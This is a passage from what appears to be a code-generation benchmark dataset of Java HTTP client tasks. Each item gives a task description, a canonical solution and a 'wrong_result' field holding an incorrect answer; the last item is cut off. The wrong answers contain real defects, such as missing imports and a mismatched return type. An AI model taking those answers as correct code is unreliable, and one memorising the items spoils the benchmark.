    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using HttpURLConnection for making HTTP requests and handling responses.\n\nClass Description: The Http class provides a static method for sending HTTP requests to a specified URL with configurable request methods and payloads. It handles connection setup, request sending, response reading, and resource cleanup.\n\nMethods:\n\nMethod1: httpsRequest(String requestUrl, String requestMethod, String outputStr) -> String - Sends an HTTP request to the specified URL using the given method and optional request body, then returns the response as a string.\n  - requestUrl: String - The target URL for the HTTP request\n  - requestMethod: String - The HTTP method to use (e.g., \"GET\", \"POST\")\n  - outputStr: String - The request body to send (can be null for requests without body)\n  - Returns: String - The response body from the server, or null if an error occurs\n\nThe method handles:\n1. Creating and configuring HttpURLConnection\n2. Setting request headers (content-type: text/xml; charset=UTF-8)\n3. Sending request body if provided\n4. Reading and concatenating response\n5. Proper resource cleanup\n6. Error handling and logging",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport com.scudata.common.Logger;\n\npublic class Http {\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {    \n        try {    \n            URL url = new URL(requestUrl);    \n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();    \n              \n            conn.setDoOutput(true);    \n            conn.setDoInput(true);    \n            conn.setUseCaches(false);    \n            conn.setRequestMethod(requestMethod);    \n            conn.setRequestProperty(\"content-type\", \"text/xml; charset=UTF-8\");\n            \n            if (null != outputStr) {    \n                OutputStream outputStream = conn.getOutputStream();    \n                outputStream.write(outputStr.getBytes(\"UTF-8\"));    \n                outputStream.close();    \n            }    \n            \n            InputStream inputStream = conn.getInputStream();    \n            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"utf-8\");    \n            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);    \n            String str = null;  \n            StringBuffer buffer = new StringBuffer();    \n            while ((str = bufferedReader.readLine()) != null) {    \n                buffer.append(str);    \n            }    \n            \n            bufferedReader.close();    \n            inputStreamReader.close();    \n            inputStream.close();    \n            inputStream = null;    \n            conn.disconnect();    \n            return buffer.toString();    \n        } catch (Exception e) {    \n            System.out.println(\"http exception{}\"+ e);\n            Logger.error(e.getMessage());\n        }    \n        return null;    \n    }    \n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class Http {\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {\n        HttpURLConnection conn = null;\n        try {\n            URL url = new URL(requestUrl);\n            conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(requestMethod);\n            conn.setRequestProperty(\"Content-Type\", \"text/xml; charset=UTF-8\");\n            if (outputStr != null) {\n                conn.setDoOutput(true);\n                try (OutputStream os = conn.getOutputStream()) {\n                    byte[] outputBytes = outputStr.getBytes(StandardCharsets.UTF_8);\n                    os.write(outputBytes);\n                }\n            }\n            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = br.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 106,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously to fetch and process JSON data from a given URL.\n\nClass Description: HttpRequestHandler is a utility class that contains nested classes and methods for performing asynchronous HTTP requests and processing JSON responses. The main functionality is implemented through an AsyncTask subclass to avoid blocking the main thread during network operations.\n\nAttributes: \n(None - This is a utility class with no instance attributes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - A nested AsyncTask class that performs HTTP GET requests in the background. It takes a URL as input, establishes a connection, retrieves data, and processes the response.\n\nMethod2: onProgressUpdate(String... progress) -> void - A callback method that processes the received JSON data during the task's execution. It parses the JSON array and extracts individual JSON objects.\n\nMethod3: onPostExecute(String result2) -> void - A callback method that handles post-execution tasks after the background operation completes.\n\nMethod4: ConvertInputToStringNoChange(InputStream inputStream) -> String - A helper method that converts an InputStream into a String by reading all lines from the input stream and concatenating them.",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONArray json = new JSONArray(progress[0]);\n                for (int i = 0; i < json.length(); i++) {\n                    JSONObject user = json.getJSONObject(i);\n                    // Handle the parsed JSON data here\n                }\n            } catch (Exception ex) {}\n        }\n\n        protected void onPostExecute(String result2) {\n            // Handle post-execution tasks here\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while ((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    public static class MyAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                URL obj = new URL(url);\n                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n                conn.setRequestMethod(\"GET\");\n                conn.connect();\n                InputStream inputStream = conn.getInputStream();\n                String result = ConvertInputToStringNoChange(inputStream);\n                return result;\n            } catch (Exception e) {\n                e.printStackTrace();\n                return null;\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            // Process JSON data here\n        }\n\n        @Override\n        protected void onPostExecute(String result2) {\n            // Handle post-execution tasks\n        }\n    }\n\n    public MyAsyncTask getNews(String... params) {\n        return new MyAsyncTask().execute(params);\n    }\n\n    public void onProgressUpdate(String... progress) {\n        // Process JSON data during task execution\n    }\n\n    public void onPostExecute(String result2) {\n        // Handle tasks after background operation completes\n    }\n\n    public String ConvertInputToStringNoChange(InputStream inputStream) {\n        StringBuilder sb = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        try {\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return sb.toString();\n    }\n}"
  },
  {
    "Task_id": 107,
    "Instruction": "Task Description: Implement a Java class that handles HTTP downloads with support for redirects and user-agent customization.\n\nClass Description: The HttpDownloader class provides functionality to download files from HTTP URLs while handling redirects (up to a maximum limit) and allowing customization of the User-Agent header. It includes logging capabilities for tracking download progress and errors.\n\nAttributes:\n- logger: Logger - SLF4J logger for tracking download operations and errors\n- MAXIMUM_REDIRECTS: int - Maximum number of redirects to follow (constant value 8)\n\nMethods:\n- download(String targetUrlString, Path path, String userAgent) -> void - Main method to initiate download from a URL to a specified path with a custom user agent. Throws IOException for network or file operation failures.\n- getDownloadedOrNextUrl(String urlString, Path path, String userAgent) -> Optional<String> - Helper method that processes a single URL request, either downloading the content or returning the next URL in case of redirect. Throws IOException for network or file operation failures. Returns Optional.empty() if download was successful, or Optional containing the next URL if redirect occurred.",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardCopyOption;\nimport java.util.Optional;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nclass HttpDownloader {\n    private static final Logger logger = LoggerFactory.getLogger(HttpDownloader.class);\n    private static final int MAXIMUM_REDIRECTS = 8;\n\n    public static void download(final String targetUrlString, final Path path, final String userAgent) throws IOException {\n        logger.info(\"Started download from: \" + targetUrlString);\n\n        String urlString = targetUrlString;\n        for (int i = 0; i < MAXIMUM_REDIRECTS; ++i) {\n            final Optional<String> nextUrlString = getDownloadedOrNextUrl(urlString, path, userAgent);\n            if (!nextUrlString.isPresent()) {\n                return;\n            }\n            logger.info(\"Redirected to: \" + nextUrlString.get());\n            urlString = nextUrlString.get();\n        }\n        throw new IOException(\"Too many redirects from: \" + targetUrlString);\n    }\n\n    private static Optional<String> getDownloadedOrNextUrl(final String urlString, final Path path, final String userAgent)\n            throws IOException {\n        logger.debug(\"Requesting GET {}\", urlString);\n        final URL url;\n        try {\n            url = new URL(urlString);\n        } catch (final MalformedURLException ex) {\n            throw new IOException(\"Invalid URL: \" + urlString, ex);\n        }\n\n        final HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Accept\", \"*/*\");\n            connection.setRequestProperty(\"User-Agent\", userAgent);\n            connection.connect();\n\n            final int statusCode = connection.getResponseCode();\n            logger.debug(\"Received HTTP status code {} from GET {}\", statusCode, urlString);\n            switch (statusCode) {\n                case HttpURLConnection.HTTP_MOVED_PERM:\n                case HttpURLConnection.HTTP_MOVED_TEMP:\n                    final String location = connection.getHeaderField(\"Location\");\n                    if (location == null) {\n                        throw new IOException(\"No Location header for HTTP status code \" + statusCode);\n                    }\n                    return Optional.of(location);\n                case HttpURLConnection.HTTP_OK:\n                    final InputStream downloadStream = connection.getInputStream();\n                    logger.info(\"Downloading from {} into {}\", urlString, path.toString());\n                    Files.copy(downloadStream, path, StandardCopyOption.REPLACE_EXISTING);\n                    logger.info(\"Downloaded\");\n                    return Optional.empty();\n                default:\n                    final String responseMessage;\n                    try {\n                        responseMessage = connection.getResponseMessage();\n                    } catch (final IOException ex) {\n                        throw new IOException(\"Unexpected HTTP status code \" + statusCode, ex);\n                    }\n                    throw new IOException(\"Unexpected HTTP status code \" + statusCode + \" with message: \" + responseMessage);\n            }\n        } finally {\n            connection.disconnect();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Optional;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class HttpDownloader {\n    private static final Logger logger = LoggerFactory.getLogger(HttpDownloader.class);\n    private static final int MAXIMUM_REDIRECTS = 8;\n\n    public void download(String targetUrlString, Path path, String userAgent) throws IOException {\n        int redirectCount = 0;\n        String currentUrl = targetUrlString;\n        while (redirectCount < MAXIMUM_REDIRECTS) {\n            Optional<String> nextUrl = getDownloadedOrNextUrl(currentUrl, path, userAgent);\n            if (nextUrl.isEmpty()) {\n                return;\n            } else {\n                currentUrl = nextUrl.get();\n                redirectCount++;\n            }\n        }\n        throw new IOException(\"Too many redirects\");\n    }\n\n    public Optional<String> getDownloadedOrNextUrl(String urlString, Path path, String userAgent) throws IOException {\n        HttpClient client = HttpClient.newHttpClient();\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(urlString))\n                .header(\"User-Agent\", userAgent)\n                .GET()\n                .build();\n        HttpResponse<InputStream> response = client.send(request, HttpResponse.BodyHandlers.ofInputStream());\n        int statusCode = response.statusCode();\n        if (statusCode >= 300 && statusCode < 400) {\n            String location = response.headers().firstValue(\"Location\").orElseThrow(() -> new IOException(\"Missing Location header in redirect\"));\n            logger.info(\"Redirecting to {}\", location);\n            return Optional.of(location);\n        } else if (statusCode == 200) {\n            try (InputStream inputStream = response.body();\n                 FileOutputStream fileOutputStream = new FileOutputStream(path.toFile())) {\n                byte[] buffer = new byte[8192];\n                int bytesRead;\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    fileOutputStream.write(buffer, 0, bytesRead);\n                }\n            }\n            logger.info(\"Download completed to {}\", path);\n            return Optional.empty();\n        } else {\n            throw new IOException(\"Unexpected HTTP status code: \" + statusCode);\n        }\n    }\n}"
  },
  {
    "Task_id": 108,
    "Instruction": "Task Description: Create a utility class for handling various HTTP operations including GET, POST requests, file downloads, and form submissions.\n\nClass Description: WebUtils is a utility class that provides static methods for performing common HTTP operations. It handles connection management, request configuration, and response processing.\n\nMethods:\n\nMethod1: getBody(String reqURL) -> String - Performs a GET request to the specified URL and returns the response body as a string.\nMethod2: getJson(String reqURL) -> JsonNode - Performs a GET request to the specified URL and parses the JSON response into a JsonNode object.\nMethod3: downloadFile(String reqURL, String fileLocation) -> void - Downloads a file from the specified URL and saves it to the given file location.\nMethod4: post(String reqURL, String postContent) -> String - Performs a POST request with plain text content to the specified URL and returns the response body.\nMethod5: postForm(String reqURL, Map<String, String> fields) -> String - Performs a form submission (application/x-www-form-urlencoded) to the specified URL with the given form fields and returns the response body.\nMethod6: getLineStream(String reqURL) -> Stream<String> - Performs a GET request to the specified URL and returns the response as a stream of lines.\nMethod7: getUserAgent() -> String - Returns a formatted User-Agent string for HTTP requests.\nMethod8: connectionToString(HttpURLConnection con) -> String - Helper method that reads the response from an HttpURLConnection and converts it to a string.",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport org.geysermc.geyser.GeyserImpl;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\nimport java.util.Map;\nimport java.util.stream.Stream;\n\npublic class WebUtils {\n\n    public static String getBody(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            con.setConnectTimeout(10000);\n            con.setReadTimeout(10000);\n\n            return connectionToString(con);\n        } catch (Exception e) {\n            return e.getMessage();\n        }\n    }\n\n    public static JsonNode getJson(String reqURL) throws IOException {\n        HttpURLConnection con = (HttpURLConnection) new URL(reqURL).openConnection();\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setConnectTimeout(10000);\n        con.setReadTimeout(10000);\n        return GeyserImpl.JSON_MAPPER.readTree(con.getInputStream());\n    }\n\n    public static void downloadFile(String reqURL, String fileLocation) {\n        try {\n            HttpURLConnection con = (HttpURLConnection) new URL(reqURL).openConnection();\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            InputStream in = con.getInputStream();\n            Files.copy(in, Paths.get(fileLocation), StandardCopyOption.REPLACE_EXISTING);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Unable to download and save file: \" + fileLocation + \" (\" + reqURL + \")\", e);\n        }\n    }\n\n    public static String post(String reqURL, String postContent) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"text/plain\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setDoOutput(true);\n\n        OutputStream out = con.getOutputStream();\n        out.write(postContent.getBytes(StandardCharsets.UTF_8));\n        out.close();\n\n        return connectionToString(con);\n    }\n\n    private static String connectionToString(HttpURLConnection con) throws IOException {\n        con.getResponseCode();\n\n        InputStream inputStream = con.getErrorStream();\n        if (inputStream == null) {\n            inputStream = con.getInputStream();\n        }\n\n        StringBuilder content = new StringBuilder();\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(inputStream))) {\n            String inputLine;\n\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n                content.append(\"\\n\");\n            }\n\n            con.disconnect();\n        }\n\n        return content.toString();\n    }\n\n    public static String postForm(String reqURL, Map<String, String> fields) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setDoOutput(true);\n\n        try (OutputStream out = con.getOutputStream()) {\n            for (Map.Entry<String, String> field : fields.entrySet()) {\n                out.write((field.getKey() + \"=\" + URLEncoder.encode(field.getValue(), StandardCharsets.UTF_8) + \"&\").getBytes(StandardCharsets.UTF_8));\n            }\n        }\n\n        return connectionToString(con);\n    }\n\n    public static Stream<String> getLineStream(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            con.setConnectTimeout(10000);\n            con.setReadTimeout(10000);\n\n            return connectionToString(con).lines();\n        } catch (Exception e) {\n            GeyserImpl.getInstance().getLogger().error(\"Error while trying to get a stream from \" + reqURL, e);\n            return Stream.empty();\n        }\n    }\n\n    public static String getUserAgent() {\n        return \"Geyser-\" + GeyserImpl.getInstance().getPlatformType().platformName() + \"/\" + GeyserImpl.VERSION;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class WebUtils {\n    private WebUtils() {}\n\n    public static String getBody(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            int responseCode = con.getResponseCode();\n            try (InputStream is = con.getInputStream()) {\n                StringBuilder response = new StringBuilder();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            }\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error fetching GET request\", e);\n        }\n    }\n\n    public static JsonNode getJson(String reqURL) {\n        try {\n            String jsonStr = getBody(reqURL);\n            ObjectMapper mapper = new ObjectMapper();\n            return mapper.readTree(jsonStr);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error parsing JSON\", e);\n        }\n    }\n\n    public static void downloadFile(String reqURL, String fileLocation) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            try (InputStream is = con.getInputStream(); FileOutputStream fos = new FileOutputStream(fileLocation)) {\n                byte[] buffer = new byte[1024];\n                int len;\n                while ((len = is.read(buffer)) >= 0) {\n                    fos.write(buffer, 0, len);\n                }\n            }\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error downloading file\", e);\n        }\n    }\n\n    public static String post(String reqURL, String postContent) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"POST\");\n            con.setDoOutput(true);\n            con.setRequestProperty(\"Content-Type\", \"text/plain\");\n            con.setRequestProperty(\"Content-Length\", String.valueOf(postContent.length()));\n            try (OutputStream os = con.getOutputStream()) {\n                os.write(postContent.getBytes());\n            }\n            return connectionToString(con);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error performing POST request\", e);\n        }\n    }\n\n    public static String postForm(String reqURL, Map<String, String> fields) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"POST\");\n            con.setDoOutput(true);\n            con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            StringBuilder postData = new StringBuilder();\n            for (Map.Entry<String, String> field : fields.entrySet()) {\n                if (postData.length() > 0) postData.append('&');\n                postData.append(encode(field.getKey())).append('=').append(encode(field.getValue()));\n            }\n            con.setRequestProperty(\"Content-Length\", String.valueOf(postData.length()));\n            try (OutputStream os = con.getOutputStream()) {\n                os.write(postData.toString().getBytes());\n            }\n            return connectionToString(con);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error performing form POST request\", e);\n        }\n    }\n\n    private static String encode(String s) {\n        try {\n            return java.net.URLEncoder.encode(s, \"UTF-8\");\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error encoding URL\", e);\n        }\n    }\n\n    public static Stream<String> getLineStream(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()))) {\n                return reader.lines();\n            }\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error fetching line stream\", e);\n        }\n    }\n\n    public static String getUserAgent() {\n        return \"Java-WebUtils/1.0 (Java/\" + System.getProperty(\"java.version\") + \")\";\n    }\n\n    private static String connectionToString(HttpURLConnection con) {\n        try {\n            StringBuilder response = new StringBuilder();\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n            }\n            return response.toString();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error reading connection response\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable timeouts and headers.\n\nClass Description: The RealRequest class provides functionality to make HTTP GET and POST requests with configurable connection settings. It handles request creation, header management, response processing, and error handling.\n\nAttributes:\n- sRequestURL: String - Static field storing the last requested URL\n- httpConfig: HttpConfig - Configuration object for connection settings (timeouts, etc.)\n- TAG: String - Constant for logging purposes (value: \"SA.HttpRequest\")\n\nMethods:\n- getData(String requestURL, Map<String, String> headerMap) -> RealResponse - Performs a GET request to the specified URL with optional headers\n- postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) -> RealResponse - Performs a POST request with request body, content type, and optional headers\n- getHttpURLConnection(String requestURL, String requestMethod) -> HttpURLConnection - Creates and configures an HttpURLConnection instance\n- setHeader(HttpURLConnection conn, Map<String, String> headerMap) -> void - Applies headers to the connection\n- getRealResponse(HttpURLConnection conn) -> RealResponse - Processes the HTTP response into a standardized format\n- getExceptionResponse(Exception e) -> RealResponse - Creates an error response from an exception\n- setHttpConfig(HttpConfig httpConfig) -> RealRequest - Sets the HTTP configuration (builder pattern)",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.sensorsdata.analytics.android.sdk.SAConfigOptions;\nimport com.sensorsdata.analytics.android.sdk.SALog;\nimport com.sensorsdata.analytics.android.sdk.SensorsDataAPI;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport javax.net.ssl.HttpsURLConnection;\nimport static com.sensorsdata.analytics.android.sdk.util.Base64Coder.CHARSET_UTF8;\n\nclass RealRequest {\n    private static final String TAG = \"SA.HttpRequest\";\n    private static String sRequestURL;\n    private HttpConfig httpConfig = new HttpConfig();\n\n    RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        try {\n            SALog.i(TAG, String.format(\"url:%s,\\nmethod:GET\", requestURL));\n            sRequestURL = requestURL;\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"GET\");\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        BufferedWriter writer = null;\n        try {\n            HttpURLConnection conn;\n            sRequestURL = requestURL;\n            SALog.i(TAG, String.format(\"url:%s\\nparams:%s\\nmethod:POST\", requestURL, body));\n            conn = getHttpURLConnection(requestURL, \"POST\");\n            conn.setDoOutput(true);\n            conn.setUseCaches(false);\n            if (!TextUtils.isEmpty(bodyType)) {\n                conn.setRequestProperty(\"Content-Type\", bodyType);\n            }\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            if (!TextUtils.isEmpty(body)) {\n                writer = new BufferedWriter(new OutputStreamWriter(conn.getOutputStream(), CHARSET_UTF8));\n                writer.write(body);\n                writer.flush();\n            }\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (writer != null) {\n                try {\n                    writer.close();\n                } catch (IOException e) {\n                    SALog.printStackTrace(e);\n                }\n            }\n        }\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) throws IOException {\n        URL url = new URL(requestURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n        conn.setUseCaches(false);\n        conn.setConnectTimeout(httpConfig.getConnectionTimeout());\n        conn.setReadTimeout(httpConfig.getReadTimeout());\n        if (requestMethod.equals(\"POST\")) {\n            conn.setDoOutput(true);\n        }\n        SAConfigOptions configOptions = SensorsDataAPI.getConfigOptions();\n        if (configOptions != null && configOptions.getSSLSocketFactory() != null\n                && conn instanceof HttpsURLConnection) {\n            ((HttpsURLConnection) conn).setSSLSocketFactory(configOptions.getSSLSocketFactory());\n        }\n        return conn;\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        if (headerMap != null) {\n            for (String key : headerMap.keySet()) {\n                conn.setRequestProperty(key, headerMap.get(key));\n            }\n        }\n    }\n\n    private RealResponse getRealResponse(HttpURLConnection conn) {\n        RealResponse response = new RealResponse();\n        try {\n            response.code = conn.getResponseCode();\n            if (HttpUtils.needRedirects(response.code)) {\n                response.location = HttpUtils.getLocation(conn, sRequestURL);\n            }\n            response.contentLength = conn.getContentLength();\n            if (response.code < HttpURLConnection.HTTP_BAD_REQUEST) {\n                response.result = HttpUtils.getRetString(conn.getInputStream());\n            } else {\n                response.errorMsg = HttpUtils.getRetString(conn.getErrorStream());\n            }\n        } catch (IOException e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        RealResponse response = new RealResponse();\n        response.exception = e;\n        response.errorMsg = e.getMessage();\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        if(httpConfig == null) {\n            return this;\n        }\n        this.httpConfig = httpConfig;\n        return this;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class RealResponse {\n    private final int statusCode;\n    private final String statusMessage;\n    private final String responseBody;\n    private final String errorMessage;\n\n    public RealResponse(int statusCode, String statusMessage, String responseBody, String errorMessage) {\n        this.statusCode = statusCode;\n        this.statusMessage = statusMessage;\n        this.responseBody = responseBody;\n        this.errorMessage = errorMessage;\n    }\n\n    public int getStatusCode() { return statusCode; }\n    public String getStatusMessage() { return statusMessage; }\n    public String getResponseBody() { return responseBody; }\n    public String getErrorMessage() { return errorMessage; }\n}\n\npublic class HttpConfig {\n    private int connectTimeout;\n    private int readTimeout;\n\n    public HttpConfig setConnectTimeout(int connectTimeout) {\n        this.connectTimeout = connectTimeout;\n        return this;\n    }\n\n    public HttpConfig setReadTimeout(int readTimeout) {\n        this.readTimeout = readTimeout;\n        return this;\n    }\n\n    public int getConnectTimeout() {\n        return connectTimeout;\n    }\n\n    public int getReadTimeout() {\n        return readTimeout;\n    }\n}\n\npublic class RealRequest {\n    public static String sRequestURL;\n    private HttpConfig httpConfig;\n    public static final String TAG = \"SA.HttpRequest\";\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        this.httpConfig = httpConfig;\n        return this;\n    }\n\n    public RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        sRequestURL = requestURL;\n        try {\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"GET\");\n            setHeader(conn, headerMap);\n            int responseCode = conn.getResponseCode();\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    public RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        sRequestURL = requestURL;\n        try {\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"POST\");\n            setHeader(conn, headerMap);\n            conn.setRequestProperty(\"Content-Type\", bodyType);\n            conn.setDoOutput(true);\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = body.getBytes(StandardCharsets.UTF_8);\n                os.write(input, 0, input.length);\n            }\n            int responseCode = conn.getResponseCode();\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) throws IOException {\n        URL url = new URL(requestURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n        conn.setInstanceFollowRedirects(false);\n        conn.setConnectTimeout(httpConfig.getConnectTimeout());\n        conn.setReadTimeout(httpConfig.getReadTimeout());\n        return conn;\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        if (headerMap != null) {\n            for (Map.Entry<String, String> entry : headerMap.entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n    }\n\n 